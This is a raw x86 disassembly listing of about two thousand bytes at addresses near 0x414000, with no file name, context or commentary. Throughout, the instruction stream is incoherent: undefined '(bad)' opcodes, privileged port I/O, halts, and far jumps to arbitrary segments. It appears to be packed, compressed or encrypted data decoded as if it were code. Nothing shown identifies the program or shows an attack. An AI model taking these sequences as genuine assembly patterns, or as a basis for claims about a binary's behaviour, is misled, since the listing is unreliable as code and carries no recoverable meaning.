  41434e:	stos   BYTE PTR es:[edi],al
  41434f:	inc    eax
  414350:	scas   al,BYTE PTR es:[edi]
  414351:	and    DWORD PTR fs:[esi],0x735f14b3
  414358:	adc    esp,ebp
  41435a:	pop    esi
  41435b:	mov    gs:0x8cc4bb74,eax
  414361:	jne    0x41431b
  414363:	or     al,0xcb
  414365:	xchg   BYTE PTR [edx],ch
  414367:	ret    0x94cb
  41436a:	dec    edi
  41436b:	push   cs
  41436c:	(bad)
  414370:	call   DWORD PTR [eax]
  414372:	imul   DWORD PTR [ebx]
  414374:	in     eax,0xa8
  414376:	lds    eax,FWORD PTR [edx-0x16820a4a]
  41437c:	adc    ecx,DWORD PTR [edi-0x4f]
  41437f:	push   ds
  414380:	add    BYTE PTR [ecx+0x10],cl
  414383:	(bad)
  414386:	xchg   ecx,eax
  414387:	mov    DWORD PTR [eax-0x1c2a1967],esp
  41438d:	popa   
  41438e:	test   eax,0x82670603
  414393:	dec    ecx
  414394:	call   0xdbc54d0e
  414399:	or     ebp,esp
  41439b:	addr16 and eax,0x4def8a4b
  4143a1:	sub    DWORD PTR [esi-0x7f],edi
  4143a4:	mov    ds:0x73b940c8,al
  4143a9:	mov    al,0x5f
  4143ab:	outs   dx,DWORD PTR ds:[esi]
  4143ac:	fdivr  st,st(0)
  4143ae:	mov    bl,0x8d
  4143b0:	cmc    
  4143b1:	cmp    al,0x14
  4143b3:	add    BYTE PTR [eax+0x62],cl
  4143b6:	sbb    al,0x32
  4143b8:	loopne 0x4143dc
  4143ba:	jb     0x414415
  4143bc:	pushf  
  4143bd:	nop
  4143be:	push   ds
  4143bf:	ins    DWORD PTR es:[edi],dx
  4143c0:	imul   ecx,DWORD PTR [edx],0xffffff9d
  4143c3:	mov    ebx,0x6af3b044
  4143c8:	jns    0x414434
  4143ca:	inc    edi
  4143cb:	addr16 je 0x414445
  4143ce:	sub    al,0x47
  4143d0:	clc    
  4143d1:	loope  0x414414
  4143d3:	pop    edi
  4143d4:	pop    esp
  4143d5:	jno    0x414363
  4143d7:	cld    
  4143d8:	pop    eax
  4143d9:	aam    0xa0
  4143db:	push   ebx
  4143dc:	jmp    0x9feb1712
  4143e1:	adc    DWORD PTR [eax+eax*1+0x2f],ebx
  4143e5:	push   cs
  4143e6:	ja     0x414378
  4143e8:	cmp    esp,DWORD PTR ds:0x801baa5f
  4143ee:	xchg   edi,eax
  4143ef:	retf   0x2c8d
  4143f2:	test   eax,0x4a5042f8
  4143f7:	gs mov esp,0xe8cdca54
  4143fd:	lds    eax,FWORD PTR [edx+0x17a01d5b]
  414403:	pusha  
  414404:	pop    eax
  414405:	paddq  mm3,QWORD PTR ds:0x751aed46
  41440c:	mov    bl,0x1a
  41440e:	cli    
  41440f:	xchg   ebp,eax
  414410:	int    0xf6
  414412:	cwde   
  414413:	and    DWORD PTR [ebx-0x68],0x1c
  414417:	mov    edx,0xbe4d0c26
  41441d:	out    0xb3,eax
  41441f:	push   ecx
  414420:	mov    ebp,0x9392b3e9
  414425:	jle    0x4143d8
  414427:	sbb    ecx,DWORD PTR [eax+0x2a7c99a8]
  41442d:	mov    dl,0x5d
  41442f:	stc    
  414430:	iret   
  414431:	sti    
  414432:	clc    
  414433:	pop    esi
  414434:	sbb    eax,0x2d2a1060
  414439:	and    ch,BYTE PTR [edx-0x7b9c1d47]
  41443f:	dec    eax
  414440:	mov    esp,0xaa7f1066
  414445:	loop   0x4143dd
  414447:	or     dl,al
  414449:	jmp    0x84c:0xc0c7561e
  414450:	cmp    edx,DWORD PTR [edi+esi*8]
  414453:	or     al,BYTE PTR [ebx]
  414455:	sbb    esi,DWORD PTR [ebx+esi*8]
  414458:	retf   
  414459:	into   
  41445a:	mov    DWORD PTR [ebp-0x38246956],ebx
  414460:	lea    ebx,[eax]
  414462:	scas   al,BYTE PTR es:[edi]
  414463:	xor    ebx,DWORD PTR [esi]
  414465:	retf   0x8d8e
  414468:	push   ecx
  414469:	mov    al,0xd7
  41446b:	mov    ds:0x8ae8df67,al
  414470:	in     al,0x5e
  414472:	popa   
  414473:	pop    eax
  414474:	mov    edi,0xdfdf19bd
  414479:	jge    0x4144c2
  41447b:	out    0x62,al
  41447d:	and    dl,BYTE PTR [ebx]
  41447f:	or     ch,BYTE PTR [edx-0x4e]
  414482:	aam    0xef
  414484:	lds    edx,FWORD PTR [ecx-0x16dfc36e]
  41448a:	sbb    esp,DWORD PTR [esi+0x7ff01cfe]
  414490:	neg    ch
  414492:	cli    
  414493:	mov    bl,0x36
  414495:	out    0xdb,al
  414497:	mov    edx,0x2e1164ac
  41449c:	shl    BYTE PTR [edx],cl
  41449e:	ret    0x2429
  4144a1:	cmp    ch,bl
  4144a3:	sbb    BYTE PTR [edx],bh
  4144a5:	mov    edx,0xa79363bf
  4144aa:	cmp    bl,al
  4144ac:	aam    0x5b
  4144ae:	(bad)  
  4144af:	out    dx,eax
  4144b0:	fwait
  4144b1:	rcr    esp,0x7e
  4144b4:	jp     0x414506
  4144b6:	adc    DWORD PTR [edx+0x154dd71],edx
  4144bc:	leave  
  4144bd:	test   al,0x22
  4144bf:	pop    eax
  4144c0:	push   eax
  4144c1:	lds    ebx,FWORD PTR [esi+0x1479b57c]
  4144c7:	sbb    ch,bl
  4144c9:	loopne 0x4144ef
  4144cb:	dec    edi
  4144cc:	add    al,0x8f
  4144ce:	adc    esi,0xb3590557
  4144d4:	xor    cl,0x83
  4144d7:	mov    dh,0xc2
  4144d9:	dec    eax
  4144da:	retf   0x5931
  4144dd:	ja     0x414466
  4144df:	xlat   BYTE PTR ds:[ebx]
  4144e0:	(bad)  
  4144e1:	mov    cl,0x9e
  4144e3:	push   esp
  4144e4:	push   0x27
  4144e6:	aam    0x1
  4144e8:	and    esi,DWORD PTR [ecx+eax*1-0xff8da00]
  4144ef:	push   edi
  4144f0:	dec    esp
  4144f1:	mov    ebx,0x7b4ebd81
  4144f6:	mov    dh,0x6a
  4144f8:	push   ebp
  4144f9:	inc    edi
  4144fa:	imul   bl
  4144fc:	dec    eax
  4144fd:	inc    eax
  4144fe:	dec    ebx
  4144ff:	mov    WORD PTR ds:0x516517fb,cs
  414505:	xor    al,0x5c
  414507:	fsubr  QWORD PTR [edi+0x365007ba]
  41450d:	hlt    
  41450e:	push   0xffffffe5
  414510:	sbb    eax,0x87e75b8a
  414515:	dec    eax
  414516:	mov    dh,0xd7
  414518:	stc    
  414519:	mov    dh,0x1d
  41451b:	in     al,dx
  41451c:	push   0x7c7604d2
  414521:	xchg   ebp,eax
  414522:	arpl   WORD PTR [edi+edi*1-0x3d],dx
  414526:	dec    edx
  414527:	dec    ebx
  414528:	push   edi
  414529:	ror    BYTE PTR [ebp+0x15],1
  41452c:	push   edx
  41452d:	mov    ebx,0xa0da7509
  414532:	inc    edx
  414533:	xor    edi,ebp
  414535:	cmp    BYTE PTR [ebx-0x71],bh
  414538:	ficomp DWORD PTR [edx+edx*8]
  41453b:	jg     0x4145a8
  41453d:	or     eax,0xc4be2e1c
  414542:	push   0x389191cd
  414547:	inc    edx
  414548:	stos   BYTE PTR es:[edi],al
  414549:	add    bl,dh
  41454b:	lahf   
  41454c:	lahf   
  41454d:	pop    esp
  41454e:	inc    edx
  41454f:	cmc    
  414550:	adc    dl,al
  414552:	add    dh,BYTE PTR [eax+0x66]
  414555:	sub    DWORD PTR ds:0x89cb19ad,ebx
  41455b:	push   edi
  41455c:	cmp    dh,BYTE PTR [esi+0x3d]
  41455f:	fisubr WORD PTR [esi-0x57]
  414562:	dec    esi
  414563:	adc    BYTE PTR [ecx+0x65],dl
  414566:	test   BYTE PTR [eax],0x80
  414569:	jp     0x414502
  41456b:	rol    BYTE PTR [edi+0x5dc4473f],0xb8
  414572:	pop    ss
  414573:	mov    ebp,esp
  414575:	gs xor edi,edi
  414578:	data16 out dx,al
  41457a:	js     0x414553
  41457c:	jbe    0x414514
  41457e:	out    dx,eax
  41457f:	dec    eax
  414580:	fdiv   DWORD PTR [ebx-0x7c]
  414583:	pop    ss
  414584:	addr16 jo 0x414596
  414587:	rcr    BYTE PTR [edi-0x5a],cl
  41458a:	test   eax,0x2f242a4d
  41458f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414590:	aaa    
  414591:	ds aam 0xc9
  414594:	and    BYTE PTR [esi],ah
  414596:	pop    edx
  414597:	(bad)  
  414598:	push   ebp
  414599:	pop    es
  41459a:	push   edi
  41459b:	retf   0x3a72
  41459e:	inc    eax
  41459f:	les    ebp,FWORD PTR [edx]
  4145a1:	mov    dl,0x77
  4145a3:	ss sbb ah,bh
  4145a6:	test   dl,bh
  4145a8:	aas    
  4145a9:	and    dl,BYTE PTR [esi-0x20]
  4145ac:	jmp    0xb97ef5b8
  4145b1:	inc    esp
  4145b2:	loope  0x41461e
  4145b4:	sahf   
  4145b5:	jno    0x4145e4
  4145b7:	mov    edi,0xbfde1543
  4145bc:	scas   eax,DWORD PTR es:[edi]
  4145bd:	jmp    0xae87:0x617ec69f
  4145c4:	sbb    BYTE PTR [edx+0x843d9ca],ch
  4145ca:	in     eax,dx
  4145cb:	xlat   BYTE PTR ds:[ebx]
  4145cc:	push   ds
  4145cd:	inc    edx
  4145ce:	sub    edi,eax
  4145d0:	push   0x4f68b21c
  4145d5:	popa   
  4145d6:	add    al,0x9f
  4145d8:	cdq    
  4145d9:	jo     0x4145a4
  4145db:	dec    edi
  4145dc:	mov    ebp,0x5eac47eb
  4145e1:	sbb    dh,BYTE PTR [ebp-0x24253533]
  4145e7:	fwait
  4145e8:	out    0x2f,al
  4145ea:	repz push eax
  4145ec:	jmp    0xa30f84cd
  4145f1:	lods   eax,DWORD PTR ds:[esi]
  4145f2:	pusha  
  4145f3:	out    0x9c,eax
  4145f5:	icebp  
  4145f6:	mov    cl,dh
  4145f8:	mov    BYTE PTR [eax+0x61],ah
  4145fb:	ins    BYTE PTR es:[edi],dx
  4145fc:	(bad)  
  4145fe:	mov    bl,0xe1
  414600:	mov    cl,BYTE PTR [edx-0x6d2e9f31]
  414606:	scas   eax,DWORD PTR es:[edi]
  414607:	inc    edi
  414608:	mov    bh,0x1d
  41460a:	jmp    0xea33:0x84b11454
  414611:	xor    DWORD PTR [esi-0xc],edx
  414614:	adc    ah,BYTE PTR ds:0x7054b15b
  41461a:	popf   
  41461b:	or     DWORD PTR [eax-0x1f9c15f9],esp
  414621:	pop    esi
  414622:	out    dx,al
  414623:	pop    ebp
  414624:	and    edx,DWORD PTR [esi+0x5b]
  414627:	inc    esp
  414628:	push   cs
  414629:	push   edx
  41462a:	out    0x69,eax
  41462c:	pop    eax
  41462d:	bound  esi,QWORD PTR [edx]
  41462f:	mov    al,ds:0xc830be11
  414634:	fucom  st(3)
  414636:	addr16 push edi
  414638:	aas    
  414639:	cld    
  41463a:	cmp    BYTE PTR [edx],0x4e
  41463d:	jo     0x4145df
  41463f:	leave  
  414640:	out    0x95,al
  414642:	mov    ds:0x523633f9,al
  414647:	mov    al,ds:0xcd7591c4
  41464c:	sub    BYTE PTR [ecx+0x34181a32],cl
  414652:	test   BYTE PTR [edi+0x6f],dh
  414655:	lods   al,BYTE PTR ds:[esi]
  414656:	jbe    0x414604
  414658:	loop   0x414636
  41465a:	dec    esp
  41465b:	mov    ebx,ebp
  41465d:	push   0xfffffffc
  41465f:	mov    esi,0x183a4694
  414664:	das    
  414665:	cmp    eax,0xf0a9c9fb
  41466a:	mov    BYTE PTR [ebx+0x6d682dfa],ah
  414670:	pop    esp
  414671:	addr16 lock fsubrp st(0),st
  414675:	hlt    
  414676:	jle    0x4146b8
  414678:	sub    ch,BYTE PTR [edi]
  41467a:	inc    edi
  41467b:	jo     0x4146d9
  41467d:	push   eax
  41467e:	jbe    0x414649
  414680:	leave  
  414681:	in     eax,0xb3
  414683:	mov    ah,BYTE PTR [eax]
  414685:	hlt    
  414686:	call   0x4cd9:0xb397c878
  41468d:	outs   dx,DWORD PTR ds:[esi]
  41468e:	cwde   
  41468f:	xchg   esp,eax
  414690:	nop
  414691:	enter  0xb2b9,0xf5
  414695:	and    al,0x3b
  414697:	xchg   ebx,eax
  414698:	fist   WORD PTR [ebx+0x15]
  41469b:	cmp    BYTE PTR [ebx+ebx*4-0x5f],0x4d
  4146a0:	xchg   ebx,eax
  4146a1:	hlt    
  4146a2:	or     al,0x86
  4146a4:	(bad)  
  4146a5:	mov    eax,edi
  4146a7:	lsl    esi,WORD PTR [esi+ecx*1]
  4146ab:	repnz mov cs,WORD PTR [ecx+0x6]
  4146af:	fs inc edi
  4146b1:	enter  0x4503,0x98
  4146b5:	retf   
  4146b6:	div    BYTE PTR es:[ecx+0x631e295b]
  4146bd:	aad    0xc3
  4146bf:	mov    DWORD PTR [eax],edi
  4146c1:	enter  0x5a0c,0x99
  4146c5:	mov    ds:0x9bbcc98e,eax
  4146ca:	aad    0xad
  4146cc:	xchg   DWORD PTR [edi-0x64],edi
  4146cf:	test   DWORD PTR [edi+eiz*1],ebx
  4146d2:	adc    eax,0xe2771094
  4146d7:	push   ss
  4146d8:	mov    eax,es
  4146da:	cdq    
  4146db:	pop    ebp
  4146dc:	jecxz  0x414691
  4146de:	mov    edi,DWORD PTR [eax]
  4146e0:	push   ss
  4146e1:	ficomp DWORD PTR [edi-0x6a46b1c4]
  4146e7:	mov    ecx,DWORD PTR [ebx]
  4146e9:	push   0xffffffc2
  4146eb:	enter  0x63e,0xf3
  4146ef:	test   al,0x99
  4146f1:	gs iret 
  4146f3:	imul   ebx,DWORD PTR [esi+edi*8+0x6d],0x17a60687
  4146fb:	ret    
  4146fc:	fcom   DWORD PTR [ecx]
  4146fe:	inc    esi
  4146ff:	jo     0x414713
  414701:	loopne 0x41474a
  414703:	or     edx,DWORD PTR [eax-0x11]
  414706:	push   ebx
  414707:	jbe    0x4146e5
  414709:	xor    ebp,DWORD PTR [ebp+0x3660192f]
  41470f:	push   es
  414710:	xchg   ecx,eax
  414711:	sub    BYTE PTR [ebp-0x37e38e47],bh
  414717:	mov    ds:0x189704c7,eax
  41471c:	sbb    eax,0x6572668a
  414721:	mov    cl,0x79
  414723:	pop    esp
  414724:	mov    ah,0xdd
  414726:	cmp    edi,edx
  414728:	or     al,0xa4
  41472a:	andnps xmm5,XMMWORD PTR [eax+ebp*4+0x27e28aaa]
  414732:	fldenv [eax]
  414734:	dec    ebx
  414735:	xlat   BYTE PTR ds:[ebx]
  414736:	mov    ch,0x27
  414738:	and    al,0x8b
  41473a:	or     BYTE PTR [edi-0xf],0x6d
  41473e:	sbb    eax,DWORD PTR [edi+edx*8+0x3209e7b]
  414745:	mov    bl,0xa2
  414747:	xor    BYTE PTR [edx-0x45],ah
  41474a:	mov    ebp,DWORD PTR [ebx]
  41474c:	push   ebp
  41474d:	fisttp WORD PTR [edx]
  41474f:	fistp  DWORD PTR fs:0x68fa954
  414756:	add    BYTE PTR [edi+ebx*8-0x33],ch
  41475a:	ja     0x414776
  41475c:	arpl   bx,cx
  41475e:	mov    eax,ds:0x6a6730ef
  414763:	int3   
  414764:	jmp    0xcdc5:0xf6861a00
  41476b:	push   ebx
  41476c:	and    DWORD PTR [edx-0x1],esp
  41476f:	push   esp
  414770:	cmp    BYTE PTR ss:[ebx],dl
  414773:	cld    
  414774:	fsubr  DWORD PTR [ebx-0x480377ac]
  41477a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41477b:	test   ebp,ebp
  41477d:	mov    al,ds:0x103de02
  414782:	cli    
  414783:	(bad)  
  414784:	retf   
  414785:	pop    ebp
  414786:	mov    edi,0xbc1e674c
  41478b:	int    0x77
  41478d:	or     al,0x23
  41478f:	and    esi,edi
  414791:	sti    
  414792:	xchg   edi,eax
  414793:	ins    DWORD PTR es:[edi],dx
  414794:	mov    edx,DWORD PTR [edx-0x7c]
  414797:	imul   edi,DWORD PTR [ecx+0x51b0e5e1],0x4f
  41479e:	jg     0x4147e1
  4147a0:	add    al,0x23
  4147a2:	cmp    edx,0xe458f2d9
  4147a8:	pop    es
  4147a9:	jmp    0xa2cc8aee
  4147ae:	push   ebx
  4147af:	sub    BYTE PTR [eax-0x3a],dl
  4147b2:	add    DWORD PTR [edx+0x589a1b7c],ebx
  4147b8:	push   cs
  4147b9:	imul   edx,DWORD PTR ds:0x321179bd,0xba7325c6
  4147c3:	or     cl,BYTE PTR [esi]
  4147c5:	add    DWORD PTR [edx-0x2131a976],eax
  4147cb:	hlt    
  4147cc:	int3   
  4147cd:	scas   al,BYTE PTR es:[edi]
  4147ce:	shl    DWORD PTR [ecx+0x166dae02],cl
  4147d4:	int3   
  4147d5:	ret    
  4147d6:	mov    esi,ebp
  4147d8:	jb     0x41483f
  4147da:	loope  0x414809
  4147dc:	(bad)  
  4147dd:	push   edi
  4147de:	push   esi
  4147df:	adc    ecx,DWORD PTR [edx+0x59]
  4147e2:	repnz outs dx,BYTE PTR ds:[esi]
  4147e4:	popf   
  4147e5:	pop    edx
  4147e6:	hlt    
  4147e7:	jg     0x4147be
  4147e9:	xor    cl,BYTE PTR [edx+ebp*4-0x5a8429f7]
  4147f0:	xlat   BYTE PTR ds:[ebx]
  4147f1:	pop    eax
  4147f2:	xor    DWORD PTR [edi],0xce48faff
  4147f8:	inc    eax
  4147f9:	in     al,dx
  4147fa:	loope  0x4147d0
  4147fc:	mov    BYTE PTR [ecx-0x26],bh
  4147ff:	nop
  414800:	jns    0x4147e3
  414802:	push   es
  414803:	call   0xbfca:0xd1c0eecb
  41480a:	xchg   esi,eax
  41480b:	icebp  
  41480c:	dec    ebx
  41480d:	cs nop
  41480f:	sbb    DWORD PTR [ecx-0x55b9b3e8],edx
  414815:	ficom  WORD PTR [esi]
  414817:	xchg   BYTE PTR [eax],al
  414819:	leave  
  41481a:	(bad)  
  41481b:	mov    bl,0xae
  41481d:	or     eax,0x8bc1b12
  414822:	outs   dx,DWORD PTR ds:[esi]
  414823:	pushf  
  414824:	scas   eax,DWORD PTR es:[edi]
  414825:	mov    ecx,0x11c8a469
  41482a:	pop    es
  41482b:	xor    esp,edi
  41482d:	retf   
  41482e:	jge    0x4147d1
  414830:	mov    eax,ds:0x9406cdbf
  414835:	cld    
  414836:	les    edx,FWORD PTR [edx]
  414838:	adc    cl,BYTE PTR [ebx]
  41483a:	or     al,0x6f
  41483c:	inc    eax
  41483d:	mov    dh,0x12
  41483f:	aam    0xa8
  414841:	sti    
  414842:	stc    
  414843:	outs   dx,BYTE PTR ds:[esi]
  414844:	adc    al,0x2f
  414846:	mov    ds:0x561be919,al
  41484b:	dec    esi
  41484c:	xchg   BYTE PTR [edx-0x2f],bl
  41484f:	jp     0x414855
  414851:	cmp    eax,DWORD PTR [ecx]
  414853:	sub    al,0x3e
  414855:	ss (bad) 
  414857:	cmp    ebp,edi
  414859:	xchg   esp,eax
  41485a:	(bad)  
  41485b:	xlat   BYTE PTR ds:[ebx]
  41485c:	ficomp DWORD PTR [esi+ebp*8+0x11]
  414860:	add    DWORD PTR [edx+0x6b],ebx
  414863:	mov    esp,0xd119f2c3
  414868:	or     eax,0x8d4be128
  41486d:	scas   al,BYTE PTR es:[edi]
  41486e:	jno    0x4148c5
  414870:	in     eax,0x28
  414872:	sbb    BYTE PTR [edx-0x33126194],bl
  414878:	inc    edi
  414879:	in     al,dx
  41487a:	or     al,0x27
  41487c:	jae    0x4148a5
  41487e:	cmp    DWORD PTR [ebx+ebp*2+0x4da1dfde],0xffffffa0
  414886:	call   0x49e0:0x2f6001fd
  41488d:	call   DWORD PTR [eax-0x65]
  414890:	stos   BYTE PTR es:[edi],al
  414891:	std    
  414892:	retf   0xd714
  414895:	adc    BYTE PTR [ecx+0x60add29a],0xd
  41489c:	or     DWORD PTR [esi-0x69],ecx
  41489f:	xchg   ebx,eax
  4148a0:	cwde   
  4148a1:	cmp    esp,esp
  4148a3:	pop    esp
  4148a4:	inc    ebx
  4148a6:	fnstsw WORD PTR [edi-0x4f]
  4148a9:	or     ebx,ecx
  4148ab:	fisttp QWORD PTR [ecx+0x6]
  4148ae:	(bad)  
  4148af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b0:	pop    esi
  4148b1:	js     0x41491b
  4148b3:	sub    bh,BYTE PTR [ecx-0x6f]
  4148b6:	shr    DWORD PTR [edx],1
  4148b8:	stc    
  4148b9:	lods   eax,DWORD PTR ds:[esi]
  4148ba:	div    edi
  4148bc:	cld    
  4148bd:	ins    BYTE PTR es:[edi],dx
  4148be:	les    edx,FWORD PTR [edx+eax*1-0x10]
  4148c2:	xchg   esi,eax
  4148c3:	ja     0x414913
  4148c5:	jbe    0x4148a1
  4148c7:	push   ecx
  4148c8:	push   ebx
  4148c9:	ret    0xb040
  4148cc:	out    0x97,al
  4148ce:	sbb    eax,0x555cb913
  4148d3:	mov    al,0x25
  4148d5:	lods   al,BYTE PTR ds:[esi]
  4148d6:	fist   DWORD PTR [ebp+0x60683a52]
  4148dc:	mov    dl,0x5
  4148de:	and    al,0x85
  4148e0:	popf   
  4148e1:	jmp    0x5f73:0x5d9649f6
  4148e8:	xchg   esi,eax
  4148e9:	mov    esi,0x19f99589
  4148ee:	ret    
  4148ef:	and    ebp,esi
  4148f1:	dec    eax
  4148f2:	sub    DWORD PTR [ebx-0x56],edi
  4148f5:	mov    eax,DWORD PTR [ecx-0x4168fc4b]
  4148fb:	push   eax
  4148fc:	stos   BYTE PTR es:[edi],al
  4148fd:	dec    edx
  4148fe:	retf   
  4148ff:	pop    eax
  414900:	ret    
  414901:	aaa    
  414902:	aam    0x52
  414904:	ds addr16 sbb ch,ah
  414908:	mov    edi,0xa6c706c8
  41490d:	out    dx,eax
  41490e:	call   0xdb66:0xd6f1fd50
  414915:	mov    ecx,0xebf9429b
  41491a:	enter  0x8ccc,0x9b
  41491e:	and    al,0x26
  414920:	sti    
  414921:	cmp    ebx,DWORD PTR [esi-0x7aac95b4]
  414927:	push   ss
  414928:	jle    0x4148ab
  41492a:	in     al,0x4
  41492c:	dec    ebx
  41492d:	fcom   DWORD PTR [ebx]
  41492f:	jmp    0x8af:0xc22abe0b
  414936:	sbb    BYTE PTR [ebx-0x35],bl
  414939:	mov    dh,0xa7
  41493b:	loope  0x4148eb
  41493d:	push   ebx
  41493e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493f:	loop   0x41491b
  414941:	sub    ebx,ecx
  414943:	arpl   WORD PTR [esi-0x29],sp
  414946:	hlt    
  414947:	test   eax,0x287fb3
  41494c:	jl     0x4148e0
  41494e:	aam    0x2f
  414950:	push   es
  414951:	mov    BYTE PTR [eax-0x1c],bl
  414954:	sub    al,0x64
  414956:	push   0x5d
  414958:	aas    
  414959:	push   ecx
  41495a:	je     0x4148f2
  41495c:	mov    ds,WORD PTR [ecx+0x5e09d21c]
  414962:	sub    BYTE PTR [eax],ch
  414964:	ret    0x5def
  414967:	jmp    0x414984
  414969:	div    DWORD PTR [ecx-0x4ed85f20]
  41496f:	and    DWORD PTR [ebp+0x4ef9bca6],esp
  414975:	addr16 xchg ecx,eax
  414977:	xchg   ecx,eax
  414978:	add    BYTE PTR [eax+0x62f0f7c1],al
  41497e:	arpl   WORD PTR [eax-0x70],bp
  414981:	mov    ds:0x376b64df,eax
  414986:	(bad)  
  414987:	rcl    BYTE PTR [ebx-0xb6a24b2],cl
  41498d:	mov    WORD PTR [eax],ds
  41498f:	test   DWORD PTR [edi],0x10ccf73c
  414995:	mov    eax,ds:0x36cec3a8
  41499a:	inc    esi
  41499b:	cmp    DWORD PTR [ebp+0x1f50e6fa],esp
  4149a1:	outs   dx,BYTE PTR ds:[esi]
  4149a2:	test   BYTE PTR [ebx-0x51],al
  4149a5:	add    al,0x87
  4149a7:	in     eax,0x23
  4149a9:	adc    BYTE PTR [edx],cl
  4149ab:	jae    0x4149a9
  4149ad:	test   eax,0xdc34fa3e
  4149b2:	mov    ss:0x273ff4f8,al
  4149b8:	add    ah,ch
  4149ba:	cwde   
  4149bb:	in     eax,dx
  4149bc:	cli    
  4149bd:	dec    DWORD PTR [edx]
  4149bf:	or     dh,BYTE PTR [esi]
  4149c1:	retf   
  4149c2:	imul   edx,DWORD PTR [eax+0xd],0xffffffbe
  4149c6:	dec    ebx
  4149c7:	mov    ch,0x0
  4149c9:	or     edx,DWORD PTR [edx-0x11]
  4149cc:	ret    
  4149cd:	test   bl,bh
  4149cf:	sbb    bl,cl
  4149d1:	push   ebp
  4149d2:	pop    es
  4149d3:	xor    eax,0xb9f870e3
  4149d8:	sub    DWORD PTR [ebp+ecx*2-0x3e],0x6f
  4149dd:	rep lods eax,DWORD PTR ds:[esi]
  4149df:	mov    ebp,ebp
  4149e1:	lods   eax,DWORD PTR ds:[esi]
  4149e2:	mov    ebp,0x69e8fa02
  4149e7:	mov    bl,0xfb
  4149e9:	das    
  4149ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149eb:	fdivr  QWORD PTR [eax]
  4149ed:	mov    eax,ds:0xc4c4682f
  4149f2:	stos   BYTE PTR es:[edi],al
  4149f3:	pop    ebx
  4149f4:	pop    ebp
  4149f5:	sub    eax,0xa141351e
  4149fa:	mov    eax,ds:0x65a93fa8
  4149ff:	or     cl,bh
  414a01:	sbb    edi,esp
  414a03:	cmp    bl,BYTE PTR [ebx+0x6a]
  414a06:	cmp    al,0x59
  414a08:	iret   
  414a09:	mov    al,ds:0x22507cad
  414a0e:	test   DWORD PTR [edx],ebp
  414a10:	scas   eax,DWORD PTR es:[edi]
  414a11:	xchg   esi,eax
  414a12:	sub    eax,DWORD PTR ds:0x24797d4e
  414a18:	xor    DWORD PTR [edi+edx*4],esp
  414a1b:	jp     0x414a82
  414a1d:	mov    ds:0x3895bf5a,eax
  414a22:	xor    eax,0xda75162e
  414a27:	in     al,0x6a
  414a29:	in     al,0xa3
  414a2b:	cmp    DWORD PTR [edx-0x77],ebp
  414a2e:	push   edx
  414a2f:	bound  edx,QWORD PTR [esi+0x1e]
  414a32:	inc    eax
  414a33:	hlt    
  414a34:	stos   BYTE PTR es:[edi],al
  414a35:	push   0xc972e72b
  414a3a:	ins    BYTE PTR es:[edi],dx
  414a3b:	es inc esp
  414a3d:	add    al,al
  414a3f:	das    
  414a40:	push   cs
  414a41:	push   ds
  414a42:	add    eax,0x78a613e5
  414a47:	inc    ecx
  414a48:	push   edi
  414a49:	in     eax,dx
  414a4a:	mov    edx,0xb74466fb
  414a4f:	pop    esi
  414a50:	push   ebx
  414a51:	jmp    0xc15577e6
  414a56:	jmp    0x5b354c19
  414a5b:	mov    esi,0xd53d208c
  414a60:	daa    
  414a61:	jo     0x414a71
  414a63:	dec    esi
  414a64:	sbb    DWORD PTR [ebp-0x5485f3f2],0x50
  414a6b:	cmp    BYTE PTR [eax-0x6427f5c0],ah
  414a71:	das    
  414a72:	mov    gs,ecx
  414a74:	push   ds
  414a75:	js     0x414ae7
  414a77:	ja     0x414a71
  414a79:	loop   0x414aea
  414a7b:	dec    esi
  414a7c:	add    al,0x59
  414a7e:	mov    dh,0x4a
  414a80:	out    dx,al
  414a81:	pop    edi
  414a82:	dec    esp
  414a83:	mov    WORD PTR [esi-0x39508f77],fs
  414a89:	pop    ebp
  414a8a:	shl    BYTE PTR [esi],0x7d
  414a8d:	mov    BYTE PTR [esi],al
  414a8f:	jmp    0x38a4:0x28093dc9
  414a96:	rcr    DWORD PTR [ecx+0x40eeb622],1
  414a9c:	and    eax,0x710ea1f5
  414aa1:	test   BYTE PTR [eax+0x381d34d8],bl
  414aa7:	shl    BYTE PTR [bp+si-0x6f3a],cl
  414aac:	jo     0x414af7
  414aae:	ror    DWORD PTR [edx],1
  414ab0:	xor    DWORD PTR [edi],ebx
  414ab2:	push   ss
  414ab3:	xchg   edi,eax
  414ab4:	into   
  414ab5:	jae    0x414a6f
  414ab7:	loope  0x414b15
  414ab9:	push   ecx
  414aba:	scas   al,BYTE PTR es:[edi]
  414abb:	sub    BYTE PTR [ebx-0x3594e416],0x85
  414ac2:	and    eax,0x30dfecee
  414ac7:	lods   eax,DWORD PTR ds:[esi]
  414ac8:	adc    ch,bl
  414aca:	and    al,0x31
  414acc:	fimul  DWORD PTR [edi]
  414ace:	and    dl,BYTE PTR ds:0x194b73f0
  414ad4:	mov    edx,0xcefff5b1
  414ad9:	mov    ds:0xb72e9fd7,eax
  414ade:	sbb    eax,0xfaf305db
  414ae3:	jbe    0x414a81
  414ae5:	jle    0x414b11
  414ae7:	mov    bl,0x25
  414ae9:	ss or  eax,0xd52de89a
  414aef:	in     eax,0x1a
  414af1:	xor    edx,edx
  414af3:	lods   al,BYTE PTR ds:[esi]
  414af4:	pop    ds
  414af5:	fisub  WORD PTR [edi-0x53]
  414af8:	xchg   BYTE PTR [ecx],bl
  414afa:	popf   
  414afb:	pusha  
  414afc:	and    dl,BYTE PTR [esi-0x51]
  414aff:	xchg   esp,eax
  414b00:	and    edx,DWORD PTR [esp+edi*8]
  414b03:	popf   
  414b04:	pop    esp
  414b05:	cmp    ebx,ebx
  414b07:	xchg   ecx,eax
  414b08:	ja     0x414b4b
  414b0a:	test   al,0x0
  414b0c:	and    al,dl
  414b0e:	inc    ecx
  414b0f:	push   ecx
  414b10:	push   ebp
  414b11:	adc    BYTE PTR [eax-0x42],al
  414b14:	sub    al,0x62
  414b16:	xor    BYTE PTR ds:0xa3383440,0x32
  414b1d:	add    eax,0xf093a47c
  414b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b23:	pop    esi
  414b24:	shl    BYTE PTR [ecx],cl
  414b26:	mov    ecx,0xefec6068
  414b2b:	mov    ebp,0x145689a4
  414b30:	hlt    
  414b31:	add    BYTE PTR [ebp-0x2a],ah
  414b34:	mov    cl,0x52
  414b36:	cdq    
  414b37:	xchg   ebx,eax
